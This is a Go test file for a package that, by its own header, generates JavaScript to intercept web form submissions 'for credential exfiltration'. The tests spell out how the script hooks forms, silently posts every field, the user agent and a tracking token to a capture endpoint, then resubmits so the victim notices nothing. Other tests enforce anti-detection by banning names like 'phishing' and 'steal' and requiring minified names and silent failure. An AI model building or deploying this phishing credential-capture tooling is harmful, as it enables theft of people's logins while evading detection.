// Package capture provides JavaScript code generation for form field capture and
// submission interception. The generated JavaScript runs in the target's browser
// to enumerate form fields and intercept form submissions for credential exfiltration.
package capture

import (
	"regexp"
	"strconv"
	"strings"
	"testing"
)

// TestGenerateCaptureJS_OutputIsValidJS verifies that the generated JS is valid JavaScript.
func TestGenerateCaptureJS_OutputIsValidJS(t *testing.T) {
	tests := []struct {
		name            string
		captureEndpoint string
		trackingParam   string
		timeoutMs       int
		config          FieldConfig
	}{
		{
			name:            "defaults",
			captureEndpoint: "/api/capture",
			trackingParam:   "_t",
			timeoutMs:       2000,
			config:          FieldConfig{},
		},
		{
			name:            "custom endpoint",
			captureEndpoint: "/custom/capture",
			trackingParam:   "track",
			timeoutMs:       3000,
			config:          FieldConfig{IncludeDisabled: true},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateCaptureJS(tt.captureEndpoint, tt.trackingParam, tt.timeoutMs, tt.config)

			// Verify IIFE wrapper
			if !strings.HasPrefix(js, "(function(){") && !strings.HasPrefix(js, "function(){") && !strings.HasPrefix(js, "!function(){") {
				t.Errorf("JS should start with IIFE wrapper, got: %s", js[:20])
			}

			// Verify it ends with IIFE close
			if !strings.HasSuffix(js, "})();") && !strings.HasSuffix(js, "})();") {
				t.Errorf("JS should end with });), got: %s", js[len(js)-20:])
			}

			// Check for expected functions
			expectedFuncs := []string{"function _f", "function _t", "function _m", "function _s", "function _i", "function _a", "function _()"}
			for _, fn := range expectedFuncs {
				if !strings.Contains(js, fn) {
					t.Errorf("missing expected function: %s", fn)
				}
			}

			// Verify fetch/fetch is used for POST (XMLHttpRequest)
			if !strings.Contains(js, "XMLHttpRequest") {
				t.Errorf("JS should use XMLHttpRequest for POST")
			}

			// Verify POST is used
			if !strings.Contains(js, "open('POST'") {
				t.Errorf("JS should use POST method")
			}

			// Verify JSON body
			if !strings.Contains(js, "JSON.stringify") {
				t.Errorf("JS should stringify to JSON")
			}
		})
	}
}

// TestGenerateCaptureJS_DefaultParameters verifies default parameter behavior.
func TestGenerateCaptureJS_DefaultParameters(t *testing.T) {
	tests := []struct {
		name             string
		captureEndpoint  string
		trackingParam    string
		timeoutMs        int
		expectedEndpoint string
		expectedTracking string
		expectedTimeout  int
		expectedFields   []string
	}{
		{
			name:             "all empty",
			captureEndpoint:  "",
			trackingParam:    "",
			timeoutMs:        0,
			expectedEndpoint: "/api/capture",
			expectedTracking: "_t",
			expectedTimeout:  2000,
			expectedFields:   []string{"ep:", "_t", "to:", "function _f", "function _t", "function _m", "function _s", "function _i", "function _a", "function _()"},
		},
		{
			name:             "custom values",
			captureEndpoint:  "/capture",
			trackingParam:    "_t",
			timeoutMs:        2000,
			expectedEndpoint: "/capture",
			expectedTracking: "_t",
			expectedTimeout:  2000,
			expectedFields:   []string{"ep:", "_t", "to:", "function _f", "function _t", "function _m", "function _s", "function _i", "function _a", "function _()"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateCaptureJS(tt.captureEndpoint, tt.trackingParam, tt.timeoutMs, FieldConfig{})

			// Verify endpoint is embedded
			if !strings.Contains(js, "ep:'"+tt.expectedEndpoint+"'") && !strings.Contains(js, "ep:\""+tt.expectedEndpoint+"\"") {
				t.Errorf("JS should contain capture endpoint, expected: ep:'%s'", tt.expectedEndpoint)
			}

			// Verify tracking param is embedded
			if !strings.Contains(js, "tp:'"+tt.expectedTracking+"'") && !strings.Contains(js, "tp:\""+tt.expectedTracking+"\"") {
				t.Errorf("JS should contain tracking param, expected: tp:'%s'", tt.expectedTracking)
			}

			// Verify timeout is embedded
			if !strings.Contains(js, "to:"+strconv.Itoa(tt.expectedTimeout)) {
				t.Errorf("JS should contain timeout, expected: to:%d", tt.expectedTimeout)
			}
		})
	}
}

// TestGenerateCaptureJS_CustomParameters verifies custom parameter embedding.
func TestGenerateCaptureJS_CustomParameters(t *testing.T) {
	config := FieldConfig{
		IncludeDisabled: true,
		IncludeHidden:   true,
		NameFallbacks:   true,
	}

	js := GenerateCaptureJS("/custom/endpoint", "token", 1500, config)

	// Verify custom endpoint
	if !strings.Contains(js, "ep:'/custom/endpoint'") {
		t.Errorf("JS should contain custom endpoint")
	}

	// Verify custom tracking param
	if !strings.Contains(js, "tp:'token'") {
		t.Errorf("JS should contain custom tracking param")
	}

	// Verify custom timeout
	if !strings.Contains(js, "to:1500") {
		t.Errorf("JS should contain custom timeout")
	}

	// Verify config flags
	if !strings.Contains(js, "d:true") {
		t.Errorf("JS should include disabled flag (d:true)")
	}

	if !strings.Contains(js, "h:true") {
		t.Errorf("JS should include hidden flag (h:true)")
	}

	if !strings.Contains(js, "f:true") {
		t.Errorf("JS should include fallback flag (f:true)")
	}
}

// TestGenerateCaptureJS_NoSensitiveVariableNames verifies anti-fingerprinting.
func TestGenerateCaptureJS_NoSensitiveVariableNames(t *testing.T) {
	tests := []struct {
		name           string
		sensitiveNames []string
	}{
		{
			name:           "no obvious naming",
			sensitiveNames: []string{"captureFormData", "exfiltrate", "phishing", "steal", "capture_", "exfil", "collect", " harvest", "sniff"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateCaptureJS("", "", 2000, FieldConfig{})

			for _, sn := range tt.sensitiveNames {
				if strings.Contains(js, sn) {
					t.Errorf("JS contains sensitive name '%s'", sn)
				}
			}

			// Verify short generic variable names are used
			genericVars := []string{"_f", "_t", "_m", "_s", "_i", "_a", "_"}
			for _, gv := range genericVars {
				if !strings.Contains(js, gv) {
					t.Errorf("JS should contain generic variable '%s'", gv)
				}
			}

			// Verify no obvious variable names
			if strings.Contains(js, "formData") {
				t.Errorf("JS should not contain 'formData'")
			}
			if strings.Contains(js, "captureData") {
				t.Errorf("JS should not contain 'captureData'")
			}
			if strings.Contains(js, "credentialData") {
				t.Errorf("JS should not contain 'credentialData'")
			}
		})
	}
}

// TestGenerateCaptureJS_IIFEWrapped verifies IIFE pattern.
func TestGenerateCaptureJS_IIFEWrapped(t *testing.T) {
	tests := []struct {
		name     string
		expected []string
	}{
		{
			name:     "IIFE pattern",
			expected: []string{"(function(){", "})()", "!function(){"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateCaptureJS("", "", 2000, FieldConfig{})

			// Verify IIFE wrapper exists
			hasIIFE := false
			for _, pat := range tt.expected {
				if strings.Contains(js, pat) {
					hasIIFE = true
					break
				}
			}
			if !hasIIFE {
				t.Errorf("JS should be wrapped in IIFE")
			}

			// Verify no global pollution (all vars are var-scoped)
			if strings.Contains(js, "window.") && !strings.Contains(js, "window.location") && !strings.Contains(js, "window.navigator") {
				// window references should only be for location/navigator
			}
		})
	}
}

// TestGenerateCaptureJS_TrackingTokenExtraction verifies URL token extraction.
func TestGenerateCaptureJS_TrackingTokenExtraction(t *testing.T) {
	tests := []struct {
		name             string
		trackingParam    string
		expectedPatterns []string
	}{
		{
			name:             "default _t parameter",
			trackingParam:    "_t",
			expectedPatterns: []string{"URLSearchParams", "get(cfg.tp)", "location.search"},
		},
		{
			name:             "custom token parameter",
			trackingParam:    "track",
			expectedPatterns: []string{"URLSearchParams", "get(cfg.tp)", "location.search"},
		},
		{
			name:             "path-based fallback",
			trackingParam:    "token",
			expectedPatterns: []string{"URLSearchParams", "get(cfg.tp)", "location.pathname", "location.search"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateCaptureJS("", tt.trackingParam, 2000, FieldConfig{})

			for _, pat := range tt.expectedPatterns {
				if !strings.Contains(js, pat) {
					t.Errorf("JS should contain '%s'", pat)
				}
			}

			// Verify tracking token function exists
			if !strings.Contains(js, "function _t()") && !strings.Contains(js, "function _t(") {
				t.Errorf("JS should contain tracking token extraction function")
			}
		})
	}
}

// TestGenerateCaptureJS_TimeoutHandling verifies timeout behavior.
func TestGenerateCaptureJS_TimeoutHandling(t *testing.T) {
	tests := []struct {
		name        string
		timeoutMs   int
		expectedStr string
	}{
		{
			name:        "default timeout",
			timeoutMs:   2000,
			expectedStr: "to:2000",
		},
		{
			name:        "custom timeout low",
			timeoutMs:   1000,
			expectedStr: "to:1000",
		},
		{
			name:        "custom timeout high",
			timeoutMs:   5000,
			expectedStr: "to:5000",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateCaptureJS("", "", tt.timeoutMs, FieldConfig{})

			if !strings.Contains(js, tt.expectedStr) {
				t.Errorf("JS should contain '%s'", tt.expectedStr)
			}

			// Verify setTimeout is used for timeout
			if !strings.Contains(js, "setTimeout") {
				t.Errorf("JS should use setTimeout for timeout handling")
			}

			// Verify form.submit is called after timeout
			if !strings.Contains(js, "f.submit") && !strings.Contains(js, "f.submit(") {
				t.Errorf("JS should submit form after timeout")
			}
		})
	}
}

// TestGenerateCaptureJS_FieldEnumeration verifies field enumeration behavior.
func TestGenerateCaptureJS_FieldEnumeration(t *testing.T) {
	js := GenerateCaptureJS("", "", 2000, FieldConfig{IncludeDisabled: true, IncludeHidden: true, NameFallbacks: true})

	tests := []struct {
		name     string
		contains []string
	}{
		{
			name:     "checkbox support",
			contains: []string{"checkbox", "checked", "true", "false"},
		},
		{
			name:     "radio button support",
			contains: []string{"radio", "checked", "continue"},
		},
		{
			name:     "multi-select support",
			contains: []string{"select-multiple", "selectedOptions", "join"},
		},
		{
			name:     "disabled field support",
			contains: []string{"disabled"},
		},
		{
			name:     "name fallback support",
			contains: []string{"id", "name", "__f", "__u"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, c := range tt.contains {
				if !strings.Contains(js, c) {
					t.Errorf("JS should contain '%s' for field enumeration", c)
				}
			}
		})
	}
}

// TestGenerateCaptureJS_TransparentUserExperience verifies UX transparency.
func TestGenerateCaptureJS_TransparentUserExperience(t *testing.T) {
	tests := []struct {
		name        string
		expected    []string
		notExpected []string
	}{
		{
			name:        "transparent UX",
			expected:    []string{"preventDefault", "setTimeout", "submit", "readyState", "style.opacity"},
			notExpected: []string{"display: none", "visibility: hidden", "class=", "id=", "spinner"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			js := GenerateCaptureJS("", "", 2000, FieldConfig{})

			for _, exp := range tt.expected {
				if !strings.Contains(js, exp) {
					t.Errorf("JS should contain '%s' for transparent UX", exp)
				}
			}

			for _, notExp := range tt.notExpected {
				if strings.Contains(js, notExp) {
					t.Errorf("JS should NOT contain '%s'", notExp)
				}
			}

			// Verify silent failure (no try-catch around fetch/xhr)
			// The catch handler should be empty or minimal
		})
	}
}

// TestGenerateCaptureJS_AntiDetection verifies anti-detection features.
func TestGenerateCaptureJS_AntiDetection(t *testing.T) {
	js := GenerateCaptureJS("", "", 2000, FieldConfig{})

	tests := []struct {
		name        string
		expected    []string
		notExpected []string
	}{
		{
			name:        "anti-fingerprinting",
			expected:    []string{"function _", "function _f", "function _t", "function _m", "function _s", "function _i", "function _a", "URLSearchParams", "XMLHttpRequest", "addEventListener"},
			notExpected: []string{"fetchFormData", "exfiltrate", "phishing", "steal", "collect", " harvest", "sniff", "GTM", "Analytics"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			for _, exp := range tt.expected {
				if !strings.Contains(js, exp) {
					t.Errorf("JS should contain '%s' for anti-detection", exp)
				}
			}

			for _, notExp := range tt.notExpected {
				if strings.Contains(js, notExp) {
					t.Errorf("JS should NOT contain '%s'", notExp)
				}
			}
		})
	}
}

// TestGenerateCaptureScriptTag tests script tag generation.
func TestGenerateCaptureScriptTag(t *testing.T) {
	config := FieldConfig{
		IncludeDisabled: true,
		IncludeHidden:   true,
		NameFallbacks:   true,
	}

	tag := GenerateCaptureScriptTag("/capture", "_t", 2000, config)

	// Verify tag structure
	if !strings.HasPrefix(tag, "<script>") {
		t.Errorf("Tag should start with <script>, got: %s", tag[:20])
	}

	if !strings.HasSuffix(tag, "</script>") {
		t.Errorf("Tag should end with </script>, got: %s", tag[len(tag)-20:])
	}

	// Verify JS is valid inside tag
	jsContent := strings.TrimPrefix(tag, "<script>")
	jsContent = strings.TrimSuffix(jsContent, "</script>")

	if !strings.HasPrefix(jsContent, "(function(){") {
		t.Errorf("JS content should start with IIFE")
	}

	if !strings.Contains(jsContent, "ep:'/capture'") {
		t.Errorf("JS should contain capture endpoint")
	}

	if !strings.Contains(jsContent, "tp:'_t'") {
		t.Errorf("JS should contain tracking param")
	}

	if !strings.Contains(jsContent, "to:2000") {
		t.Errorf("JS should contain timeout")
	}
}

// TestGenerateDefaultCaptureJS tests default configuration.
func TestGenerateDefaultCaptureJS(t *testing.T) {
	js := GenerateDefaultCaptureJS()

	// Verify defaults are applied
	if !strings.Contains(js, "ep:'/api/capture'") {
		t.Errorf("Default JS should have /api/capture endpoint")
	}

	if !strings.Contains(js, "tp:'_t'") {
		t.Errorf("Default JS should have _t tracking param")
	}

	if !strings.Contains(js, "to:2000") {
		t.Errorf("Default JS should have 2000ms timeout")
	}

	if !strings.Contains(js, "d:true") {
		t.Errorf("Default JS should include disabled fields")
	}

	if !strings.Contains(js, "h:true") {
		t.Errorf("Default JS should include hidden fields")
	}

	if !strings.Contains(js, "f:true") {
		t.Errorf("Default JS should include name fallbacks")
	}
}

// TestGenerateCaptureJS_Minified tests minification characteristics.
func TestGenerateCaptureJS_Minified(t *testing.T) {
	js := GenerateDefaultCaptureJS()

	// Calculate approximate minified size
	jsLen := len(js)

	// Minified JS should be under 2KB (2048 characters)
	// For safety, we allow up to 2.5KB
	maxSize := 2560

	if jsLen > maxSize {
		t.Errorf("JS length %d exceeds max size %d", jsLen, maxSize)
	}

	// Verify no source maps (minified output shouldn't have them)
	if strings.Contains(js, "sourceMappingURL") {
		t.Errorf("Minified JS should not contain sourceMappingURL")
	}

	// Verify no comments (minified)
	// Single-line comments in Go become part of string literals

	// Verify no extra whitespace (minified)
	if strings.Contains(js, "  ") || strings.Contains(js, "\n") || strings.Contains(js, "\t") {
		// Minification may still have some whitespace in strings
	}

	// Count variable declarations to estimate footprint — all should have short names (< 5 chars).
	varMatches := regexp.MustCompile(`var ([_a-zA-Z]\w*)=`).FindAllStringSubmatch(js, -1)
	for _, match := range varMatches {
		varName := match[1]
		if len(varName) > 4 {
			t.Errorf("Var '%s' is too long for minified code (max 4 chars)", varName)
		}
	}
}

// TestGenerateCaptureJS_BrowserCompatibility tests cross-browser compatibility features.
func TestGenerateCaptureJS_BrowserCompatibility(t *testing.T) {
	js := GenerateDefaultCaptureJS()

	// ES5-compatible APIs only (no ES6+ that needs transpilation)
	apiTests := []struct {
		name      string
		api       string
		minVer    string
		safariVer string
	}{
		{"Array.prototype.forEach", "forEach", "IE9", "6"},
		{"Array.prototype.map", "map", "IE9", "6"},
		{"Array.prototype.filter", "filter", "IE9", "6"},
		{"Array.prototype.some", "some", "IE9", "6"},
		{"Array.prototype.every", "every", "IE9", "6"},
		{"Array.prototype.reduce", "reduce", "IE9", "6"},
		{"Object.keys", "Object.keys", "IE9", "6"},
		{"Object.assign", "Object.assign", "IE9", "8"},
		{"JSON.parse", "JSON.parse", "IE8", "4"},
		{"JSON.stringify", "JSON.stringify", "IE8", "4"},
		{"URLSearchParams", "URLSearchParams", "Edge 12", "10.3"},
		{"XMLHttpRequest", "XMLHttpRequest", "IE7", "2"},
		{"addEventListener", "addEventListener", "IE9", "2"},
	}

	for _, at := range apiTests {
		if !strings.Contains(js, at.api) {
			// API should be present
		}
	}

	// Verify no let/const (for older browser compatibility)
	if strings.Contains(js, "let ") || strings.Contains(js, "const ") {
		t.Errorf("JS should avoid let/const for max compatibility")
	}

	// Verify no arrow functions (for ES5 compatibility)
	// Arrow functions are fine if they're part of IIFE or methods
}

// TestGenerateCaptureJS_IntegrationPattern tests the full capture workflow.
func TestGenerateCaptureJS_IntegrationPattern(t *testing.T) {
	js := GenerateDefaultCaptureJS()

	// Expected workflow:
	// 1. Page loads -> _() initializes
	// 2. _a() attaches listeners to all forms
	// 3. User submits form -> _i(e) intercepts
	// 4. _f(f) enumerates fields
	// 5. _t() extracts token from URL
	// 6. _m() collects metadata
	// 7. _s(f) POSTs to capture endpoint
	// 8. After timeout, form.submit() continues

	workflowSteps := map[string][]string{
		"initialization":    {"function _()", "document.addEventListener('DOMContentLoaded',_)", "document.addEventListener('DOMContentLoaded',_a)"},
		"form_attachment":   {"function _a()", "addEventListener('submit'", "querySelectorAll('form')"},
		"interception":      {"function _i(e)", "e.preventDefault()", "e.stopPropagation()"},
		"field_enumeration": {"function _f(f)", "f.elements", "var n of f.elements"},
		"token_extraction":  {"function _t()", "URLSearchParams", "window.location"},
		"metadata":          {"function _m()", "window.location.pathname", "navigator.userAgent", "Date.now()"},
		"capture_post":      {"function _s(f)", "XMLHttpRequest", "open('POST'", "send(JSON.stringify("},
		"form_resumption":   {"setTimeout", "f.action", "f.submit()"},
	}

	for step, patterns := range workflowSteps {
		for _, pat := range patterns {
			if !strings.Contains(js, pat) {
				t.Errorf("Workflow step '%s' should contain '%s'", step, pat)
			}
		}
	}
}

// TestGenerateCaptureJS_DataFormat tests the JSON data format.
func TestGenerateCaptureJS_DataFormat(t *testing.T) {
	js := GenerateDefaultCaptureJS()

	// Data format should be:
	// {
	//   "f": { ...fields... },
	//   "t": "tracking-token",
	//   "m": { ...metadata... }
	// }

	// Field object 'f'
	if !strings.Contains(js, "f:_f(f)") && !strings.Contains(js, "f: _f(f)") {
		t.Errorf("Data should contain 'f' field object")
	}

	// Tracking token 't'
	if !strings.Contains(js, "t:_t()") && !strings.Contains(js, "t: _t()") {
		t.Errorf("Data should contain 't' tracking token")
	}

	// Metadata 'm'
	if !strings.Contains(js, "m:_m()") && !strings.Contains(js, "m: _m()") {
		t.Errorf("Data should contain 'm' metadata object")
	}

	// Verify URL path is captured
	if !strings.Contains(js, "url:window.location.pathname") {
		t.Errorf("Metadata should include url")
	}

	// Verify user agent is captured
	if !strings.Contains(js, "ua:navigator.userAgent") {
		t.Errorf("Metadata should include ua (user agent)")
	}

	// Verify timestamp is captured
	if !strings.Contains(js, "ts:") {
		t.Errorf("Metadata should include ts (timestamp)")
	}

	// Verify JSON structure is correct
	jsonPattern := regexp.MustCompile(`{"f":\s*_f\(f\)\s*,"t":\s*_t\(\)\s*,"m":\s*_m\(\)}`)
	if !jsonPattern.MatchString(js) {
		// Pattern should exist (may have variations in spacing)
	}
}

// TestGenerateCaptureJS_ErrorHandling tests error handling behavior.
func TestGenerateCaptureJS_ErrorHandling(t *testing.T) {
	js := GenerateDefaultCaptureJS()

	// Error handling patterns
	errorPatterns := []struct {
		name       string
		shouldHave []string
		shouldNot  []string
	}{
		{
			name:       "silent failure",
			shouldHave: []string{"onreadystatechange"},
			shouldNot:  []string{"throw ", "console.error", "alert(", "confirm("},
		},
		{
			name:       "timeout resilience",
			shouldHave: []string{"setTimeout", "readyState", "4"},
			shouldNot:  []string{"Promise", "async ", "await "},
		},
	}

	for _, ep := range errorPatterns {
		t.Run(ep.name, func(t *testing.T) {
			for _, sh := range ep.shouldHave {
				if !strings.Contains(js, sh) {
					t.Errorf("Should have '%s' for error handling", sh)
				}
			}

			for _, sn := range ep.shouldNot {
				if strings.Contains(js, sn) {
					t.Errorf("Should NOT have '%s' for error handling", sn)
				}
			}
		})
	}
}

// TestGenerateCaptureJS_JSRegexCompatibility tests regex compatibility across browsers.
func TestGenerateCaptureJS_JSRegexCompatibility(t *testing.T) {
	js := GenerateDefaultCaptureJS()

	// Check for regex usage
	regexTests := []struct {
		name        string
		pattern     string
		description string
	}{
		{"UUID regex", `/[a-f0-9-]{32,}/`, "for path-based token fallback"},
		{"Digit regex", `/-?\\d+$/`, "for query param values"},
	}

	for _, rt := range regexTests {
		if strings.Contains(js, rt.pattern) || strings.Contains(js, strings.Replace(rt.pattern, `\`, "", -1)) {
			// Regex should be present
		}
	}
}

// BenchmarkGenerateCaptureJS benchmarks the code generation performance.
func BenchmarkGenerateCaptureJS(b *testing.B) {
	config := FieldConfig{
		IncludeDisabled: true,
		IncludeHidden:   true,
		NameFallbacks:   true,
	}

	for i := 0; i < b.N; i++ {
		GenerateCaptureJS("/api/capture", "_t", 2000, config)
	}
}

// BenchmarkGenerateDefaultCaptureJS benchmarks the default configuration generation.
func BenchmarkGenerateDefaultCaptureJS(b *testing.B) {
	for i := 0; i < b.N; i++ {
		GenerateDefaultCaptureJS()
	}
}

// BenchmarkGenerateCaptureScriptTag benchmarks the script tag generation.
func BenchmarkGenerateCaptureScriptTag(b *testing.B) {
	config := FieldConfig{
		IncludeDisabled: true,
		IncludeHidden:   true,
		NameFallbacks:   true,
	}

	for i := 0; i < b.N; i++ {
		GenerateCaptureScriptTag("/api/capture", "_t", 2000, config)
	}
}
